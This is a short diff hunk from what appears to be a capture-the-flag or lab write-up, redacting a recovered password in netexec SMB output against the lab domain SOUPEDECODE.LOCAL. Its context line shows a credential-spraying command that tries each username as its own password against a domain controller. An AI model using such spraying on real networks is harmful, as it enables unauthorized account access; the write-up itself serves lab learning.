@@ -166,7 +166,7 @@ It took a long while but the `users.txt:users.txt` pop a valid credential for `y
 
 ```bash
 $ nxc smb SOUPEDECODE.LOCAL -u users.txt -p users.txt --ignore-pw-decoding --continue-on-success --no-brute | grep "\[+\]"
-SMB                      10.48.173.246   445    DC01             [+] SOUPEDECODE.LOCAL\ybob317:ybob317 
+SMB                      10.48.173.246   445    DC01             [+] SOUPEDECODE.LOCAL\ybob317:{REDACTED} 
 ```
 
 ##### YBOB317 shares
